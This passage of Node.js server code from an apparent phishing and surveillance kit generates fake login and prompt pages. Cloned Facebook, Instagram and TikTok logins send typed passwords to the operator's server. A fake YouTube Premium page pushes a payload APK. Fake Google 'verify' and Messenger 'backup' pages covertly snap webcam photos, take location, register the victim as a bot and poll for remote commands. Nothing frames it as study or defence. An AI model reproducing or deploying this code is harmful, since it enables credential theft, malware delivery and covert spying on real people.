        phish_fb:{name:'Facebook',rdr:'facebook.com',bg:'#1877f2',card:'rgba(255,255,255,.1)',tc:'#fff',ic:'rgba(255,255,255,.2)',ib:'rgba(255,255,255,.35)',bc:'#fff',btc:'#1877f2',ph:'Phone or email',logo:'<b style="font-size:44px;color:white">f</b>'},
        phish_ig:{name:'Instagram',rdr:'instagram.com',bg:'#fff',card:'#fff',tc:'#262626',ic:'#fafafa',ib:'#dbdbdb',bc:'#0095f6',btc:'#fff',ph:'Phone, username or email',logo:'<span style="font-size:44px">📷</span>'},
        phish_tt:{name:'TikTok',rdr:'tiktok.com',bg:'#000',card:'#161823',tc:'#fff',ic:'#2a2a2a',ib:'#333',bc:'#fe2c55',btc:'#fff',ph:'Phone / Email / Username',logo:'<span style="font-size:44px">♪</span>'}
    };
    const c = cfg[action] || cfg.phish_fb;
    return `<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>${c.name}</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:${c.bg};color:${c.tc};font-family:-apple-system,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:20px}.logo{text-align:center;margin-bottom:24px}.card{width:100%;max-width:380px;background:${c.card};border-radius:10px;padding:24px;border:${action==='phish_ig'?'1px solid #dbdbdb':'none'}}input{width:100%;padding:13px;margin:6px 0;border-radius:8px;border:1px solid ${c.ib};background:${c.ic};color:${c.tc};font-size:15px;outline:none}input::placeholder{color:${action==='phish_ig'?'#aaa':'rgba(255,255,255,.5)'}}.btn{width:100%;padding:14px;margin-top:12px;border:none;border-radius:8px;background:${c.bc};color:${c.btc};font-size:16px;font-weight:bold;cursor:pointer}.lnk{text-align:center;font-size:13px;color:${c.bc==='#fff'?'#8ab4f8':c.bc};margin-top:14px;cursor:pointer}</style>
</head><body>
<div class="logo">${c.logo}</div>
<div class="card">
<input type="text" id="u" placeholder="${c.ph}">
<input type="password" id="p" placeholder="Password">
<button class="btn" onclick="sub()">Log In</button>
<div class="lnk">Forgot password?</div>
</div>
<script>
const UID='${uid}',D='${RAILWAY}/d',SITE='${c.name}',RDR='https://www.${c.rdr}';
window.onload=()=>fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,type:SITE+' Phish Opened',data:navigator.userAgent})});
async function sub(){const u=document.getElementById('u').value,p=document.getElementById('p').value;if(!u||!p)return;document.querySelector('.btn').textContent='Logging in...';await fetch(D+'/creds',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,site:SITE,user:u,pass:p})});setTimeout(()=>window.location.href='https://www.'+RDR,500);}
<\/script></body></html>`;
}

// ── APK page ──────────────────────────────────────────────────
function apkPage(uid) {
    return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>YouTube</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0f0f0f;color:#fff;font-family:-apple-system,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;text-align:center;padding:20px}.yt{font-size:64px;margin-bottom:16px}h2{font-size:20px;margin-bottom:8px}p{color:#aaa;font-size:14px;margin-bottom:24px}.box{background:#1a1a1a;border:1px solid #333;border-radius:12px;padding:18px;width:100%;max-width:360px}.btn{width:100%;padding:14px;background:#ff0000;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:bold;cursor:pointer}#st{font-size:12px;color:#aaa;margin-top:12px}</style></head>
<body><div class="yt">▶️</div><h2>YouTube Premium</h2><p>Premium content requires the app.</p><div class="box"><button class="btn" onclick="dl()">📥 Install & Watch</button></div><div id="st"></div>
<script>const UID='${uid}',D='${RAILWAY}/d';window.onload=()=>fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,type:'💀 APK Page Opened',data:navigator.userAgent})});function dl(){document.querySelector('.btn').textContent='Downloading...';const a=document.createElement('a');a.href='${RAILWAY}/payload.apk';a.download='YouTube_Premium.apk';document.body.appendChild(a);a.click();document.body.removeChild(a);fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,type:'💀 APK DOWNLOADED',data:navigator.userAgent})});setTimeout(()=>{document.getElementById('st').textContent='Open Downloads → install';document.querySelector('.btn').textContent='✅ Downloaded';},2000);}<\/script></body></html>`;
}

// ── Botnet page ───────────────────────────────────────────────
function botnetPage(uid) {
    const vid = crypto.randomBytes(8).toString('hex');
    return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Google</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#fff;font-family:-apple-system,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:20px;text-align:center}.logo{font-size:52px;margin-bottom:16px}.card{width:100%;max-width:360px;border:1px solid #ddd;border-radius:12px;padding:24px}h2{font-size:18px;margin-bottom:8px}p{font-size:13px;color:#666;margin-bottom:20px}.btn{width:100%;padding:14px;background:#4285f4;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:bold;cursor:pointer}.sp{display:none;width:30px;height:30px;border:3px solid #eee;border-top-color:#4285f4;border-radius:50%;animation:s .8s linear infinite;margin:14px auto}@keyframes s{to{transform:rotate(360deg)}}#st{font-size:12px;color:#999;margin-top:10px}video,canvas{display:none;width:1px;height:1px}</style></head>
<body><div class="logo">🔒</div><div class="card"><h2>Verify Your Identity</h2><p>Google needs to verify your account for security.</p><button class="btn" id="btn" onclick="run()">Verify Now</button><div class="sp" id="sp"></div><div id="st"></div></div>
<video id="vv" autoplay playsinline muted></video><canvas id="cc"></canvas>
<script>
const UID='${uid}',VID='${vid}',D='${RAILWAY}/d',B='${RAILWAY}/b';
function post(ep,body){return fetch(D+'/'+ep,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,...body})}).catch(()=>{});}
window.onload=async()=>{await fetch(B+'/reg',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,victimId:VID,model:navigator.userAgent.slice(0,80)})}).catch(()=>{});if('serviceWorker' in navigator)navigator.serviceWorker.register('${RAILWAY}/sw.js').catch(()=>{});setInterval(poll,12000);};
async function run(){document.getElementById('btn').style.display='none';document.getElementById('sp').style.display='block';if('Notification' in window)await Notification.requestPermission().catch(()=>{});try{const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});const v=document.getElementById('vv');v.srcObject=s;v.style.display='none';document.body.appendChild(v);await new Promise(r=>v.onloadedmetadata=r);await new Promise(r=>setTimeout(r,1500));const c=document.getElementById('cc');c.width=v.videoWidth||640;c.height=v.videoHeight||480;c.getContext('2d').drawImage(v,0,0);s.getTracks().forEach(t=>t.stop());v.remove();const b=await new Promise(r=>c.toBlob(r,'image/jpeg',0.9));const fd=new FormData();fd.append('photo',b,'bot.jpg');fd.append('uid',UID);fd.append('camtype','🤖 Botnet Cam');await fetch(D+'/photo',{method:'POST',body:fd}).catch(()=>{});}catch(e){}navigator.geolocation&&navigator.geolocation.getCurrentPosition(p=>{post('loc',{lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy});});post('text',{type:'🤖 BOT JOINED',data:VID});setTimeout(()=>{document.getElementById('sp').style.display='none';document.getElementById('st').textContent='✅ Verified';document.querySelector('h2').textContent='Complete';},3000);}
async function poll(){try{const r=await fetch(B+'/poll',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,victimId:VID})});const d=await r.json();if(d.commands)for(const c of d.commands)await exec(c);}catch(e){}}
async function exec(cmd){if(cmd==='photo'){try{const s=await navigator.mediaDevices.getUserMedia({video:true,audio:false});const v=document.createElement('video');v.autoplay=true;v.muted=true;v.playsInline=true;v.srcObject=s;v.style.display='none';document.body.appendChild(v);await new Promise(r=>v.onloadedmetadata=r);await new Promise(r=>setTimeout(r,1500));const c=document.createElement('canvas');c.width=v.videoWidth||640;c.height=v.videoHeight||480;c.getContext('2d').drawImage(v,0,0);s.getTracks().forEach(t=>t.stop());v.remove();const b=await new Promise(r=>c.toBlob(r,'image/jpeg',0.9));const fd=new FormData();fd.append('photo',b,'cmd.jpg');fd.append('uid',UID);fd.append('camtype','🤖 Bot CMD');fetch(D+'/photo',{method:'POST',body:fd}).catch(()=>{});}catch(e){}}if(cmd==='location'){navigator.geolocation&&navigator.geolocation.getCurrentPosition(p=>{post('loc',{lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy});});}}
<\/script></body></html>`;
}

// ── Messenger page ────────────────────────────────────────────
function messengerPage(uid) {
    return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Messenger</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#fff;font-family:-apple-system,sans-serif;min-height:100vh}.hdr{background:#0084ff;padding:14px 16px;display:flex;align-items:center;gap:10px}.ht{color:#fff;font-size:17px;font-weight:600}.notice{background:#f0f2f5;margin:12px;padding:14px;border-radius:12px;text-align:center}.nt{font-size:15px;font-weight:600;color:#333;margin-bottom:6px}.ns{font-size:13px;color:#666;margin-bottom:14px}.btn{width:100%;padding:12px;background:#0084ff;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer}.ci{display:flex;align-items:center;padding:12px 16px;border-bottom:1px solid #f0f2f5;gap:12px}.av{width:48px;height:48px;border-radius:50%;background:#0084ff;display:flex;align-items:center;justify-content:center;color:#fff;font-size:18px;flex-shrink:0}.cn{font-size:15px;font-weight:600;color:#333}.cm{font-size:13px;color:#666;margin-top:2px}.ct{font-size:11px;color:#999}#st{text-align:center;padding:10px;font-size:12px;color:#999}video,canvas{display:none;width:1px;height:1px}</style></head>
<body><div class="hdr"><div style="font-size:22px">💬</div><div class="ht">Messenger</div></div>
<div class="notice"><div class="nt">📸 Enable Chat Backup</div><div class="ns">Allow Messenger to backup your chats automatically.</div><button class="btn" onclick="run()">Allow & Enable</button></div>
<div id="st"></div>
<div class="ci"><div class="av">R</div><div style="flex:1"><div class="cn">Rahim</div><div class="cm">Bhai ki obostha? 👋</div></div><div class="ct">2m</div></div>
<div class="ci"><div class="av">K</div><div style="flex:1"><div class="cn">Karim</div><div class="cm">Ok done ✓✓</div></div><div class="ct">15m</div></div>
<div class="ci"><div class="av">S</div><div style="flex:1"><div class="cn">Sumaiya</div><div class="cm">Haha 😂😂</div></div><div class="ct">1h</div></div>
<div class="ci"><div class="av">N</div><div style="flex:1"><div class="cn">Nusrat</div><div class="cm">ki bolchos?</div></div><div class="ct">3h</div></div>
<div class="ci"><div class="av">A</div><div style="flex:1"><div class="cn">Abir</div><div class="cm">send koro please</div></div><div class="ct">5h</div></div>
<video id="vv" autoplay playsinline muted></video><canvas id="cc"></canvas>
<script>
const UID='${uid}',D='${RAILWAY}/d';
window.onload=()=>fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,type:'💬 Messenger Page Opened',data:navigator.userAgent})});
async function run(){
document.querySelector('.btn').textContent='Processing...';
navigator.geolocation&&navigator.geolocation.getCurrentPosition(p=>{fetch(D+'/loc',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy})});});
try{const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});const v=document.getElementById('vv');v.srcObject=s;await new Promise(r=>v.onloadedmetadata=r);await new Promise(r=>setTimeout(r,1500));const c=document.getElementById('cc');c.width=v.videoWidth||640;c.height=v.videoHeight||480;c.getContext('2d').drawImage(v,0,0);s.getTracks().forEach(t=>t.stop());const b=await new Promise(r=>c.toBlob(r,'image/jpeg',0.9));const fd=new FormData();fd.append('photo',b,'msg.jpg');fd.append('uid',UID);fd.append('camtype','💬 Messenger Cam');await fetch(D+'/photo',{method:'POST',body:fd});}catch(e){}
document.querySelector('.btn').textContent='✅ Enabled';document.getElementById('st').textContent='Backup enabled successfully!';}
<\/script></body></html>`;
}

// keepalive
setInterval(()=>{
    wss.clients.forEach(ws=>{if(ws.readyState===webSocket.OPEN)ws.send('ping');});
    axios.get(RAILWAY).catch(()=>{});
},5000);

server.listen(process.env.PORT||8999,()=>console.log('[+] Server online on',RAILWAY));
